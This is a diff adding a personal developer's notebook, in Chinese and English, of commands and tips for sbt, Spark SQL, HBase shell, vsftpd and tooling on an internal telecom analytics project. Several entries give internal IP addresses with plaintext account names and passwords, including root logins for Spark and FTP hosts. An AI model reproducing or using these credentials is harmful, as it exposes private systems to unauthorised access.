@@ -1,0 +1,4076 @@
+//sbt
+sbt update
+sbt gen-idea
+sbt compile ut:test
+
+//Sybase:
+acc:zxvmax
+pwd:zxtos / zxpos
+host:10.9.185.137
+
+//filezilla
+10.9.230.251
+acc:root
+pwd:zxvmax
+
+//svn IP
+https://10.9.170.149/svn/fresh/users
+
+//commint files as follow
+project - plugins.sbt
+src
+build.sbt
+
+//check jar package in build.sbt website sbt依赖格式    
+www.mvnrepository.com 
+
+//Unit test throw exception method!
+intercept[Throwable]{
+	XXX
+}.getMessage should be ("XXX")
+
+//in main code
+require(Boolean express, s"exception message")
+
+"[requirement failed: warning: 15] is not inside [1,10..." was not equal to "[warning: step(15)] is not inside [1,10..."
+
+//sublime插件
+	emmet
+	Html-css-js prettify
+	sublimerge 文本比较工具
+	SublimeREPL 
+	Scala Worksheet
+	原始配置；
+	{
+		"shell_cmd": "make"
+	}
+	sublime text new build system
+	{
+	    "cmd": ["D:\\scala\\bin\\scala.bat","$file"]
+	}
+
+
+//debug tool plugins for firefox
+firebugs
+
+//bootstrap 
+www.bootcss.com
+
+//小工具
+launchy & everythings
+
+//Spray case
+import akka.actor.ActorSystem
+import akka.actor._
+val system = ActorSystem("systemActor")
+class PingActor extends Actor {
+	def receive = {
+		case "ping" => println("pang")
+		case "pang" => println("ping")
+	}
+}
+val a = system.actorOf(Props[PingActor], "ping")
+//send msg
+a ! "ping"
+a ! "pang"
+
+//REST
+representational state transfer
+
+//http proxy method
+[http -> database]
+GET -> read
+POST -> updat
+PUT	-> check
+DELETE -> delete
+
+//plugin in firefox to sent post requires
+restclient
+//in chrome
+postman
+
+//like tomcat, more lighting
+Jetty
+
+//Jetty plugin for intelliJ idea
+addSbtPlugin("com.earldouglas" % "xsbt-web-plugin" % "1.0.0")
+
+//start jetty in dos
+cmd > sbt > container:start
+//stop jetty
+container:stop 
+
+//check port
+cmd > netstat -a -o
+
+//json plugin in idea
+org.json4s  json4s-native  3.2.4
+
+//UE
+UltraEdit
+
+//VMAX IP
+http://10.9.146.242:41180
+
+//SVN code
+http://10.5.70.3/ZXVMAX/CODE/
+//SVN document
+http://10.5.0.128/ZXVMAX/DOC/
+
+'/Iceburg/lte/subject/lte_subject_ULInterference_cell_day/' spark表存储路径，这个是天表的路径
+
+1.excel中“小区、栅格总数统计表直接使用原来覆盖的lte_cm_cellgridnum”是什么意思？
+2.分区字段的作用
+
+1.spark中插入数据时如何处理‘分区字段’
+2.spark中插入数据时会显示NULL，是否为数据的编码问题
+3./home/mr/spark/conf/目录下的配置文件的问题
+4.serviceaddress.conf配置文件中spark-host是否需要修改
+
+//spark, putty, IP: 10.9.233.98   PORT:22
+mr
+cd /home/mr/spark
+./bin/beeline
+!connect jdbc:hive2://10.9.233.98:18002
+
+//command for hadoop (hdfs中的文件相关操作)
+hadoop fs -ls /lte/XX
+describe formatted lte_cm_cellinfo_table
+hadoop fs -put /home/mr/xx /lte/cm/xx
+hadoop fs -rm /lte/cm/xx
+hadoop fs -cat /lte/cm/xx
+
+//sybase, IP: 10.9.185.137	Port:3000
+account: zxvmax
+password: zxpos
+
+//spark中每个表名后面跟一个组名。
+//表的location前面也加上小写的组名
+
+sbt命令窗口 ↑↓ 箭头出现乱码的解决办法
+在/sbt/conf/sbtconfig.txt里添加一行：-Dfile.encoding=ISO-8859-1
+
+自动构建工具
+Jenkins
+
+
+------------------------------------------培训后-------------------------------------------------------------
+
+
+//sublime 
+默认只支持UTF-8编码，当打开GBK文件时，文件会出现部分乱码
+解决：Preferences > Package Control (快捷键：ctrl + shift + p)， 输入install package ,安装 ConvertToUTF8 插件。 
+
+//代码追踪 http://www.cnblogs.com/hseagle/p/3826351.html
+1.如果想知道某个函数被谁所调用，可以在这个函数里面添加这个代码 new Throwable().printStackTrace() , 运行代码，可以在提示出打印出调用的情况。
+2.akka 消息跟踪
+查找LaunchTask消息的接收方
+执行：grep LaunchTask -r core/src/main
+
+//spark登录操作
+用shell登录集群中任意一台机器（除Sybase那台），使用命令 su - mr 切换到mr用户，然后使用下面这条命令登录SparkSQL：
+/home/mr/spark/bin/beeline -u "jdbc:hive2://10.9.233.98:18002" -n mr -p ""
+以上一行命令可拆为：
+cd /home/mr/spark/bin
+./beeline
+!connect jdbc:hive2://10.9.233.98:18002
+再输入mr 和 密码（此处密码为空）
+
+//云桌面ftp地址
+C盘：ftp://10.5.128.250:8964/
+D盘：ftp://10.5.128.250:8965/
+
+//chrome插件
+vimium
+
+//效率工具
+1、everything
+2、launchy
+
+//安装tortoiseSVN客户端后，右键菜单没有svn的相关选项
+1、确保安装的tortoiseSVN客户端版本与系统位数(32bits 或 64bits)一致；
+2、卸载掉现在TortoiseSVN 后，删除注册表里与svn相关的文件，具体如下：
+start->run->regedit 打开注册表,查找含有TortoiseSVN的文件，删除，我删除了以下文件夹：HKEY_CURRENT_USER\Software\TortoiseSVN
+
+//启动IntelliJ IDEA时出现 Can't use Subversion command line client:svn 错误
+1.在安装Tortoise SVN时要选中command line client.(注意：默认是没有选中该选项的，安装时不选中该选项则无法中DOS中运行svn --version等命令)
+2.可能是Tortoise SVN的版本过于陈旧或者过新，IntelliJ IDEA暂时无法支持，需要卸载原来的SVN版本，安装IntelliJ IDEA可以适配的版本。
+
+//项目的svn地址
+http://10.5.70.3/ZXVMAX/CODE/dev/ZXVMAX/vmax-app-ran
+
+//如果在svn上checkout代码后，没有执行sbt update 和 sbt gen-idea 操作，在IntelliJ IDEA中open这个项目时会报出「Resolve error」的相关错误，并且在该项目目录中没有「.idea」和「.idea_modules」文件夹。
+
+//在chrome中打开www.stackoverflow.com网站，会出现网站排版错乱，而在IE中打开则无排版问题。
+1.把chrome中缓存清空，重新打开网站。(应该是打开网站时，在load一些css或js文件时，由于墙的关系，无法顺利下载，导致排版的问题)
+
+//实战期间集群环境IP
+Spark：
+	10.9.233.98 
+	10.9.233.103 (master节点)
+	10.9.233.102
+	用户名：root 密码：zxvmax
+Sybase：
+	10.9.185.137
+	登录用户名：zxvmax 密码：zxpos
+
+//在spark中统计元素的个数，一般采用如下计算方式：
+1、利用map()函数，把各个元素映射成一个map，如 val xx = x.map(element => (element,1))
+2、对第一步生成的map变量调用 reduceByKey() 函数，如 val xxx = xx.reduceByKey( (a, b) => a + b)
+PS: 比较简短的写法为：val wordCount = words.map(word => (word, 1)).reduceByKey(_ + _)
+
+//五种使hive脚本运行更快的方法
+http://blog.csdn.net/myboyliu2007/article/details/43955255
+
+------------------------Spark学习资料------------------------------
+//张包峰的博客
+http://blog.csdn.net/zbf8441372/
+//赛赛的网络日志
+http://jerryshao.me/categories.html
+//Fxjwind的博客园
+http://www.cnblogs.com/fxjwind/p/3522473.html
+//徽沪一郎的博客园
+http://www.cnblogs.com/hseagle
+//spark为什么要实现自己的RPEL(*)
+http://blog.csdn.net/hao707822882/article/details/38052237
+------------------------Spark学习资料------------------------------
+
+//private class 作用于的范围：
+1 可以被同文件\相同包的其它class、object、trait调用
+2 可以被子package(递归所有的子包)的class、object、trait调用
+3 其它package中的元素是不可以调用该类的
+
+//使用命令sbt/sbt gen-idea编译spark源码时,报错
+bug: Nonzero exit code (128): git clone https://github.com/ScrapCodes/sbt-pom-reader.git C:\xxxx\xxxx
+问题：无法访问git所指向的服务器地址，可能被墙了。
+
+//volatile与synchronized的区别
+1.volatile本质是在告诉jvm当前变量在寄存器中的值是不确定的,需要从主存中读取,synchronized则是锁定当前变量,只有当前线程可以访问该变量,其他线程被阻塞住.
+2.volatile仅能使用在变量级别,synchronized则可以使用在变量,方法.
+3.volatile仅能实现变量的修改可见性,但不具备原子特性,而synchronized则可以保证变量的修改可见性和原子性.
+4.volatile不会造成线程的阻塞,而synchronized可能会造成线程的阻塞.
+5.volatile标记的变量不会被编译器优化,而synchronized标记的变量可以被编译器优化.
+
+//陈总建议
+1. 抽空可以学习 架构 就是我们的vmax系统的组成 有机会换版本 你就参与
+2. 掌握cdma lte 数据全流程 处理
+3. 结合一个团队的简单功能 了解真正的清洗代码实现
+4. 写代码 可以从 at开始
+
+//IE > 工具 > Internet选项 > 连接 > 局域网设置
+//使用自动配置脚本
+http://127.0.0.1:1080/pac?t=201510231501162148
+
+//下载spark源代码后，在DOS中执行sbt/sbt gen-idea时，报出如下错误：
+[error] (*:update) sbt.ResolveException: unresolved dependency: com.typesafe.sbt
+#sbt-ghpages;0.5.2: not found
+[error] unresolved dependency: com.typesafe.sbt#sbt-site;0.7.1: not found
+原因：可能是project/plugins.sbt文件中的resolvers源指向失效了；我这个spark的源码是直接在github下的zip包，而不是通过git clone下来的，有可能是因为这个原因
+解决方案：重新通过git clone https://github.com/apache/spark.git 这样的方式下载spark的源代码
+PS: 在intelliJ idea中import project里，导入sbt工程，会自动下载sbt的依赖，即使某些包下载失败了，仍会继续下载其他的包。而在DOS中会询问是否继续。
+
+//两个网站
+www.stackoverflow.com
+www.slideshare.net
+
+//ETL数据处理流程、工具
+ETL: Extract Transform Load
+
+//Spark文档中始终使用 驱动器节点(Drive) 和 执行器节点(Executor) 的概念来描述执行Spark应用的「进程」。
+//而 主节点(Master) 和 工作节点(Worker) 的概念则被用来分别表述集群管理器中的中心化和分布式的部分。
+//O'P104 P19 
+
+//DAG(Directed Acyclic Graph) 有向无环图
+
+//sbt 相关bug
+Waiting for lock on C:\Users\Administrator\.ivy2\.sbt.ivy.lock to be available..
+解决：把用户文档目录下的 ./ivy 目录中的所有 *.lock 文件删除
+若在删除 *.lock 文件的过程中，出现文件正在被某Java进程占用，无法删除的情况
+解决：打开任务管理器(快捷键：Shift + Ctrl + Esc)，在进程中把所有的 java.exe 关闭
+
+//JVM可视化工具
+/JAVA_HOME/bin/jvisualvm
+
+//spark SQL(Hive QL)
+insert overwrite table xxx (overwrite关键字？)
+insert overwrite 会覆盖已经存在的数据，如被覆盖的表中有3条数据和要插入的一条数据相同，那么覆盖后只会有一条数据；
+insert into 只是简单的copy插入，不做重复性校验；
+1.insert into是增加数据
+2.insert overwrite是删除原有数据然后在新增数据，如果有分区那么只会删除指定分区数据，其他分区数据不受影响
+
+//s""里面可以直接包含正则表达式吗？
+
+//关于 IntelliJ idea 使用的文章
+http://www.oschina.net/question/12_70799
+http://www.ituring.com.cn/article/37792
+http://www.blogjava.net/yifeng/archive/2008/08/27/224903.html
+
+//intelliJ idea 中UML的插件
+1.simpleUML
+
+//UML画图工具
+1.JUDE
+
+http://10.5.0.128/ZXVMAX/DOC/ZXVMAX%EF%BC%88V6.15%EF%BC%89/05%20%E6%95%8F%E6%8D%B7%E5%9B%A2%E9%98%9F%E5%BC%80%E5%8F%91%E8%BF%87%E7%A8%8B%E6%96%87%E6%A1%A3/13%E4%B9%98%E9%A3%8E/%E5%88%86%E4%BA%AB%E6%96%87%E6%A1%A3/
+
+//Spark内存表
+1.cache table xx_name as select ... from ...; (会创建临时表)
+删除：uncache table xx_name;(uncache内存表) 再 drop table xx_name;(drop临时表)(如果单独执行会先uncache再drop)
+2.cache table xx_table; (不会创建临时表，因为xx_table本来就存在磁盘中，但查询会查内存表)
+删除：只能使用uncache table xx_table;来释放内存，如果drop table xx_table;会把原本存放在磁盘中的table删掉。
+注意：在cache的原始表数据发生变化时，cache表会被释放掉。
+
+//spark日志功能开启，方便在程序跑完后在spark webUI中查看相关日志
+工程目录 > src > main > xx_sparkcontext.conf > "spark.eventLog.enabled,false",  
+
+//数据表的逻辑
+原始表(raw) -> 基础表(共用) -> 主题表(subject,专用)
+
+//sublime3安装install package
+http://www.cnblogs.com/luoshupeng/archive/2013/09/09/3310777.html
+
+//工参表
+
+//数据库IP
+IP:10.9.233.92 
+Port:22
+!connect jdbc:hive2://10.9.233.93:18000
+
+//scala中 Future 和 Promise 操作介绍
+http://colobu.com/2015/06/11/Scala-Future-and-Promise/
+
+//Spark RDD持久化
+默认cache()过程是将RDD persist在内存里，persist()操作可以为RDD重新指定StorageLevel
+
+//Angular.js 例子
+http://curran.github.io/screencasts/introToAngular/exampleViewer/#/
+
+//带有executor参数去启动spark-shell
+ spark-shell --executor-cores 2 --executor-memory 1g
+
+//Scala模式匹配泛型类型擦除问题
+http://www.iteblog.com/archives/1520
+注意：TypeTags不是线程安全的。
+
+//ICT管理系统
+http://10.9.146.231:41180/  (中文)
+10.9.147.250:41180
+10.9.233.92:21180
+
+//造数据工具
+10.9.170.180:8080
+
+//spark on Yarn 的优势：
+1.将spark运行在资源管理系统上将带来非常多的收益，包括：与其他计算框架共享集群资源；资源按需分配，进而提高集群资源利用率等。
+2.更丰富的资源调度功能（如队列）。
+
+Bug排查老套路：日志、监控和源码三管齐下
+
+---------------------------------------环境-----------------------------------------------
+演示环境信息如下，
+环境信息： 
+DAP Manager 节点：10.9.147.243 （http://10.9.147.243:21180 admin/空）（hostname:vmax08 小网IP:192.168.2.108） 
+
+Spark master 节点：10.9.147.245 （root/root123） （hostname:vmax10 小网IP:192.168.2.110） 
+
+Hdfs 节点: 10.9.147.246 （hostname:vmax09 小网IP:192.168.2.109） (NameNode节点) 
+
+DRS节点：10.9.147.247 （hostname:vmax05 小网IP:192.168.2.105） 
+
+DCU节点：10.9.147.248 （hostname:vmax06 小网IP:192.168.2.106） 
+
+VMAX应用服务器：10.9.147.250（http://10.9.147.250:41180 admin/空） （hostname:vmax13 小网IP:192.168.2.113） 
+
+环境URL链接：http://10.9.147.250:2323/vmaxcn_1/client/#app=CLIT&pwd=&sourcetype=vmax&user=admin 
+
+登陆ftp ,用户为root 密码为 root123 
+
+Spark服务： 启动/停止，需要通过DAP manager的服务管理界面操作。 
+sparkSQL 服务：目前需要通过手工后台操作，请务必切换到mr用户后， 到 /home/mr/spark 目录下操作 
+停止命令：./sbin/stop-thriftserver.sh 
+启动命令：./sbin/start-thriftserver.sh --master spark://vamx10:7077 --conf spark.ui.port=4100 --driver-memory 20G --executor-memory 25g --total-executor-cores 36 --driver-java-options "-XX:PermSize=128M -XX:MaxPermSize=512m -Xss32m" 
+
+登陆sparkSQL查询：切换到mr用户有，输入如下命令 
+/home/mr/spark/bin/beeline -u "jdbc:hive2://vmax10:18000/" -n mr -p "" 
+
+网页spark监控Master 运行情况：http://10.9.147.245:18080/jobs/ 
+网页spark监控SParksql thriftserver运行情况：http://10.9.147.245:4100/jobs/
+
+---------------------------------------环境-----------------------------------------------
+
+//hbase读取数据时，出现Insufficient permissions权限不足的异常
+进入hbase shell中，使用grant指令: grant '10192078','RWXCA'
+
+//运行AT时，报出Test class not found
+可能是右键new时，new的是一个file,而不是一个scala class
+
+//让sublime像IDE一样跑Java程序
+http://stackoverflow.com/questions/15289352/java-console-input-in-sublime-text-2
+http://www.oschina.net/translate/compile-and-run-java-programs-in-sublime-text-2?cmp
+
+//95环境上替换lte工程前端文件的路径
+home/netnumen/ems/ums-server/procs/ppus/vmaxlte.ppu/vmaxlte-webapp.pmu/vmaxlte.ear/vmaxlte.war
+
+//开发语言COP SVN地址
+svn地址：svn://10.9.186.151/Document/language development cop
+账号：devcop
+密码：devcop
+
+//linux命令
+crontab -l
+
+//创建ftp账户
+	#创建一个本地用户
+    useradd 选项 用户名
+  #修改密码
+		passwd 用户名
+	#修改用户主目录
+	  usermod -d 主目录路径 用户名
+	若想登陆，还必须将用户名加入userlist中
+	注意：默认情况下主目录为/home/用户名，如果想将主目录路径修改为/home/用户名/xx，那么先创建xx文件，
+
+	改变用户主目录命令：usermod -d /home/用户名/xx 用户名，最后重启下ftp：service vsftpd restart
+	如果报错：500 OOPS: cannot change directory:/home/netmax-l/netmax-l-out，这是因为创建的文件的权限不够
+	可改变文件权限或文件用户组（chmod、chown和chgrp均可）
+	如果删除文件时报错：550 Delete operation failed.
+	可改变文件用户权限：chown -R netmax-l netmax-l-out/ 即可
+
+	#将用户添加到可访问的用户组里
+	   vi /etc/vsftpd/user_list
+	具体的添加规则与vsftpd.conf文件里userlist_deny参数的设置有关
+
+	#将用户限制在自己的目录下
+		vi /etc/vsftpd/vsftpd.conf
+	设置chroot_local_user=YES即可
+
+	#启动ftp
+	/etc/rc.d/init.d/vsftpd start 
+	#重启ftp
+	/etc/rc.d/init.d/vsftpd restart 或 service vsftpd restart
+	#停止ftp
+	/etc/rc.d/init.d/vsftpd stop
+
+//etl工程jar包存放路径
+	/home/netnumen/ems/ums-server/utils/vmax-app-ran-cdma-etl
+
+//IntelliJ Idea VM参数
+	-XX:MaxPermSize=512M
+
+-----------------------------------Hbase Begin---------------------------------------
+
+1. hbase shell  //启动hbase shell，通过命令行连接hbase
+
+2. list  //在命令行下查看所有表
+
+3. scan "lte_netmaxl_nbi_calltrace", {LIMIT => 5}  //查看lte_netmaxl_nbi_calltrace表前5行数据，注意LIMIT是大写
+
+4. scan "lte_netmaxl_nbi_calltrace", { FILTER => "PrefixFilter('00004402081000000002016')" }    //尖括号可以省去
+  查找key以「00004402081000000002016」开头的value, 注意FILTER为大写，PrefixFilter大小写拼写须正确
+
+5. grant '10186847','RWXCA'  //给 10192078 用户授权 
+
+6. 命令行基本操作(增删改查) //http://www.cnblogs.com/nexiyi/p/hbase_shell.html
+  - 添加数据(当所put记录的rowkey已存在表中，则会覆盖该条记录)
+    put <table>,<rowkey>,<family:column>,<value>,<timestamp>
+  - 查询某行记录(Hbase内部是通过scan去实现get的)
+    get <table>,<rowkey>,[<family:column>,....]
+  - 扫描表
+    scan <table>, {COLUMNS => [ <family:column>,.... ], LIMIT => num}
+    另外，还可以添加STARTROW、STOPROW、TIMERANGE和FITLER等高级功能
+    > scan "t1", { FILTER => "PrefixFilter('asdf')" }   //得到行键以「asdf」开头的列值
+    > scan 't1', {STARTROW => 'abc', STOPROW => 'ijk'}  //得到行键「abc」与「ijk」之间的结果(包括abc和ijk)
+    > scan 't1', {TIMERANGE => [1461581909995, 1461581968198]}  //得到timestamp范围在[1461581909995, 1461581968198)的列值，注意右边是开区间
+  - 查询表中的数据行数
+    count <table>, {INTERVAL => intervalNum, CACHE => cacheNum}
+    INTERVAL设置多少行显示一次及对应的rowkey，默认1000；CACHE每次去取的缓存区大小，默认是10，调整该参数可提高查询速度
+  - 删除行中的某个列值(某个单元格的值)
+    delete <table>, <rowkey>,  <family:column> , <timestamp>  //必须指定列名
+  - 删除行
+    deleteall <table>, <rowkey>, <family:column>, <timestamp>   //可以不指定列名，删除整行数据
+  - 删除表中的所有数据
+    truncate <table>
+    其具体过程是：disable table -> drop table -> create table
+
+7. 权限操作
+  - 分配权限
+    grant <user> <permissions> <table> <column family> <column qualifier> 参数后面用逗号分隔
+    权限用五个字母表示： "RWXCA". 分别为READ('R'), WRITE('W'), EXEC('X'), CREATE('C'), ADMIN('A')
+  - 查看权限
+    user_permission <table>
+  - 收回权限
+    revoke <user> <table> <column family> <column qualifier>
+
+8. 表管理
+  - 查看有哪些表
+    list
+  - 创建表
+    create <table>, {NAME => <family>, VERSIONS => <VERSIONS>}
+    > 示例
+      创建表t1，有两个column family：f1，f2，且版本数均为2
+      (版本数默认为3, 通过同一个cell中不同的时间戳区分不同的版本，并降序排序，访问时优先读取最新的值。当版本数超过所定义的时，后面插入的值会覆盖前面插入的值)
+      create 't1', {NAME => 'f1', VERSIONS => 2}, {NAME => 'f2', VERSIONS => 2}
+      create 't1', 'f1', 'f2' //此时VERSIONS默认为1
+  - 删除表
+    分两步：首先disable 'table_1'，然后drop 'table_1'
+  - 查看表的结构
+    describe <table>
+  - 修改表结构(修改表结构必须先disable, 修改完以后再enable)
+    disable 't1'
+    alter 't1', {NAME => 'f1'}, {NAME => 'f2', METHOD => 'delete'}
+    enable 't1'
+
+9. Hbase Shell是使用Ruby实现的，因为在Hbase Shell中可以混入Ruby的代码
+  - 示例
+    create 't1', 'cf1'
+    循环插入多行数据到t1表中，行键开始于row-aa、row-ab, 止于row-zz
+    for i in 'a'..'z' do for j in 'a'..'z' do put 't1', "row-#{i}#{j}", "cf1:#{j}", "value-#{j}" end end 
+    注意ruby中for循环的写法，以及#{i}占位符后面使用双引号括住(非单引号)
+  - {'key1' => 'value1', 'key2' => 'value2', ...} //这是Ruby中哈希(map)数据结构的写法
+  - 'key\x00'   //单引号内的会被当作文本对待
+  - "key\x00"   //双引号内的将被替换，比如将八进制或十六进制值转换为字节
+
+10. Hbase Master 基于WEB的UI服务端口为60010，Hbase Region服务器基于WEB的UI的端口为60030
+
+11. Java中 String.getBytes() 与 Hadoop中 Bytes.toBytes() 的区别
+  - String.getBytes() 是根据平台默认的编码方式进行编码，取决于系统或配置
+  - Bytes.toBytes() 采用「utf-8」编码，相当于 String.getBytes(Charset.forName("UTF-8"))
+
+12. Hbase的存取模式：
+  - (Table, RowKey, Family, Column, Timestamp) -> value
+
+13. 查看Hbase的版本
+  - 通过Hbase shell进入Hbase命令行的时候是显示Hbase的版本
+  - 在Hbase命令行中通过version命令查询版本号
+ 
+14. help 'put' //获取关于put命令的详细用法
+
+15. 计数器相关操作 (注意：有些Hbase的版本中，该操作不可用。https://issues.apache.org/jira/browse/HBASE-10728)
+  - get_counter 't1', 'r1', 'c1'
+  - incr 't1', 'r1', 'c1', 1  //后面的「1」为增长的步长
+
+16. Hbase shell 中使用Java中的库
+  - java.text.SimpleDateFormat.new("yyyy/MM/dd HH:mm:ss").parse("2011/05/30 20:56:29").getTime()
+  - java.util.Date.new(1306760189000).toString()
+
+17. Hbase shell 中运行脚本。P263
+
+18. Hbase Master 端口为60010， Region Server 端口为60030
+
+19. Region Server(共用一个HLog) -> Region(默认256MB) -> Store -> StoreFile(MemStore) -> HFile -> 块(默认64KB)
+    读操作顺序：BlockCache -> MemStore -> HFile
+    写操作顺序：MemStore(有排序) -> 分两步同时：1. 写入WAL (防止丢失)  2. HFile
+
+20. 过滤器 (P131)
+  - 比较运算符
+    > LESS(<)
+    > LESS_OR_EQUAL (<=)
+    > EQUAL (=)
+    > NOT_EQUAL (!=)
+    > GREATER_OR_EQUAL (>=)
+    > GREATER (>)
+    > NO_OP (no operation)
+  - 比较器
+    > BinaryComparator - binary
+    > BinaryPrefixComparator - binaryprefix
+    > RegexStringComparator - regexstring (只能使用 = 或 !=)
+    > SubStringComparator - substring (只能使用 = 或 !=)
+  - 比较过滤器
+    > 行过滤器 RowFilter()
+    > 列族过滤器 FamilyFilter()
+    > 列值过滤器 QualifierFilter()
+    > 值过滤器 ValueFilter()
+    > 参考列过滤器 DependentColumnFilter() *
+        DependentColumnFilter (‘<family>’, ‘<qualifier>’[, <boolean>, <compare operator>, ‘<value comparator’])
+        {FILTER => "DependentColumnFilter('cf1', 'a', false, >= , 'binary:value-a')"}  //选择 cf1:a 该列中 >= 值 vaule-a 的行。
+  - 示例：
+    行过滤器(RowFilter)
+      import org.apache.hadoop.hbase.filter.RowFilter
+      import org.apache.hadoop.hbase.filter.SubstringComparator
+      import org.apache.hadoop.hbase.filter.CompareFilter
+      scan "cdma_netmaxc_nbi_rawdata_cdt_do",{COLUMNS=>"cf:qf",LIMIT=>10,FILTER=> RowFilter.new(CompareFilter::CompareOp::EQUAL,SubstringComparator.new("4600308931553932016-11-14"))}
+
+      new RowFilter(CompareFilter.CompareOp.LESS_OR_EQUAL, new BinaryComparator(Bytes.toBytes("row-22")))
+      ** {FILTER => "RowFilter(<=, 'binary:row-22')"}
+  - 专用过滤器
+    > 单列值过滤器 (SingleColumnValueFilter)
+        {FILTER => "SingleColumnValueFilter('cf1', 'qf1', >=, 'binary:value-a', true, false)"}
+        最后两个参数分别是<filterIfColumnMissing_boolean>, <latest_version_boolean>，默认值分别为false和true
+        <filterIfColumnMissing_boolean>为true时，过滤不匹配的行
+        <latest_version_boolean>为true时，只匹配最新版本的列值
+    > 单列排除过滤器 (SingleColumnValueExcludeFilter)
+    > 前缀过滤器 (PrefixFilter)
+        new PrefixFilter(Bytes.toBytes("row-a"))
+        {FILTER => "PrefixFilter('row-a')"}
+    > 分页过滤器 (PageFilter)
+        {FILTER => "PageFilter(5)"}  //5为<page_size>
+    > 行键过滤器 (KeyOnlyFilter)
+        只拿到行键的信息
+        shell中：{FILTER => "KeyOnlyFilter()"}
+        代码中：KeyValue.convertToKeyOnly(boolean), 默认为false,值被设为长度为0的字节数据；为true时，值被设为原值长度的字节数组。
+    > 首次行键过滤器 (FirstKeyOnlyFilter)
+        count 'lte_hbase_table', {FILTER => "FirstKeyOnlyFilter()"}
+        只访问每一行的第一列，用于行数统计时可提高效率。设置了该过滤器的扫描操作在检查完第一列之后会通知region服务器结束对当前行的扫描，因此性能得到提升。
+    > 包含结束的过滤器 (InclusiveStopFilter)
+        {FILTER => "InclusiveStopFilter('row-bb')"}  //将结束行包含在扫描结果中
+    > 时间戳过滤器 (TimestampsFilter)
+        {FILTER => "TimestampsFilter(1461634494750, 1461634494763, ...)"}
+    > 列计数过滤器 (ColumnCountGetFilter)
+        get 'lte_hbase_table', 'asdf', {FILTER => "ColumnCountGetFilter(1)"}
+        当一行的列数达到设定的最大值，该过滤器会通知扫描操作，因此不适用于scan操作，适用于get操作
+    > 列分页过滤器 (ColumnPaginationFilter) ?
+        {FILTER => "ColumnPaginationFilter(limit, offset)"}
+        跳过所有偏移量小于offset的列，并包含之后所有偏移量的limit之前(包含limit)的列
+    > 列前缀过滤器 (ColumnPrefixFilter)
+        {FILTER => "ColumnPrefixFilter('a')"}  //对列名称进行前缀匹配过滤
+    > 随机行过滤器 (RandomRowFilter)
+        scan 'lte_hbase_table', {FILTER => "RandomRowFilter(0.5)"}，参数为负数时，所有结果都被过滤；为大于1.0时，则包含所有了所有行。
+  - 附加过滤器
+    > 跳转过滤器 (SkipFilter)
+        该过滤器包装一个用户提供的过滤器，当过滤器发现某一行中的一列需要过滤时，那么「整行数据」都将被过滤掉。
+    > 全匹配过滤器 (WhileMatchFilter)
+        与SkipFilter类似，不同的是：当一条数据被过滤掉时，它就会直接放弃这次扫描操作。
+
+21. 注：在不同的Region服务器上并行执行的过滤器「不能共享」它们现在的「状态和边界」。
+
+22. Hbase shell中多个过滤器联合过滤操作，使用「AND」和「OR」连结。
+    scan 'lte_hbase_table', {FILTER => "ColumnPrefixFilter('a') AND TimestampsFilter(1461586181998, 1461634494750)"}
+
+23. Hbase中KeyValue是最小的存储单元，每个KeyValue对应一个列的值。
+    其中Key值为RowKey,ColumnFamily以及Quailifier组成，Value值为对应的列值。
+
+24. Hbase中的RPC机制：http://www.binospace.com/index.php/in-depth-analysis-hbase-rpc-0-95-version-implementation-mechanism/
+
+25. -ROOT-与.META.表  http://blog.csdn.net/chlaws/article/details/16918913
+    这两张表的表结构一样，就存储结构和操作方法来说，其与其他数据表并无差异。
+    .META.表记录了Hbase数据库中所有region的信息，包括在哪个region server以及startkey和endkey等等的信息，
+    如果Hbase中region数量很多，.META.表就会变得很大，其存储就在多个region中，
+    此时查找.META.表时效率就会变得很低，因此使用-ROOT-表来记录.META.表的信息。
+    管理-ROOT-表的region server地址被预先存放在zookeeper中。 
+
+26. HFile 数据结构的各部分
+    - Trailer通过指针找到Meta index、Data index、File info。
+    - Meta index保存每一个元数据在HFile中的位置、大小、元数据的key值。
+    - Data index保存每一个数据块在HFile中的位置、大小、块第一个cell的key值。
+    - File Info保存HFile相关信息。
+    - Meta块保存的是HFile的元数据，比如布隆过滤器。
+    - Data块保存的为具体的数据，每个数据块有个Magic头，存储偏移量和首个Key。
+
+27. 布隆过滤器(Bloom Filter)
+  - 可分为行级和行加列级布隆过滤器
+  - 是牺牲存储空间换取随机查找时间性能的一种手段
+  - 会误判(结果为数据在某个块，实际可能并不在)但不会漏判(数据实际在某块，布隆过滤器必然会判断数据在该块)
+
+28. HBase的表中的数据分割主要使用列族而不是列，不同列族的数据存储在不同的文件中。
+  - 限定列族的查询比限定列限定符(column qualifier)更有效率
+
+29. 利用管道把查询Hbase的结果输出到一个文本文件中
+    echo 'scan "cdma_netmaxc_nbi_exception_cdt_1x_qoe_accessfailurecall",{LIMIT=>10}' | hbase shell > access.txt
+	
+30. cat tmp.txt | tail -n 23 | head -n 20 | xargs -I {} echo 'scan "{}", {LIMIT => 1}' | hbase shell > data.txt
+  
+31. Hbase 资料 http://hbasefly.com/
+
+32. Hbase GC  http://hbasefly.com/2016/05/21/hbase-gc-1/
+    
+33. 合并region
+    create 'testtable', 'cf', {SPLITS => ['row-10', 'row-20', 'row-30', 'row-40', 'row-50']}  //定义拆分点：5个拆分点，共有6个region
+    for i in '0'..'9' do for j in '0'..'9' do put 'testtable', "row-#{i}#{j}", "cf:#{j}", "#{j}" end end  //插入数据
+    flush 'testtable'  //对表进行刷写到HFile
+    scan 'hbase:meta', {COLUMNS => ['info:regioninfo']}  //获取region的名字(ROW列)
+    /bin/hbase org.apache.hadoop.hbase.util.Merge TABLENAME REGION-1 REGION-2  //合并REGION-1和REGION-2, 合并前需要stop-hbase.sh停止hbase服务
+
+34. hbase hbck
+
+35. hbase bulkload方式把相关数据格式文件生成为HFile格式入库
+
+36. 在HBase当前工作模式下，Region太多或者太少都不是一件太好的事情，在实际线上环境需要选择一个折中点。
+    官方文档给出的一个推荐范围在20～200之间，而单个Region大小控制在10G~30G，比较符合实际情况。
+
+37. 集群规划资源考虑  http://hbasefly.com/2016/08/22/hbase-practise-cluster-planning/
+    Disk/Java Heap Ratio: 意思是说一台RegionServer上1bytes的Java内存大小需要搭配多大的硬盘大小最合理。
+    Disk Size / Java Heap = RegionSize / MemstoreSize * ReplicationFactor * HeapFractionForMemstore * 2
+    RegionSize对应的配置是hbase.hregion.max.filesize，一般为10~30G
+    MemstoreSize对应的配置是hbase.hregion.memstore.flush.size, 一般为128M
+    ReplicationFactor对应的配置是dfs.replication，一般为3
+    HeapFractionForMemstore对应的配置是hbase.regionserver.global.memstore.lowerLimit，一般是0.4
+
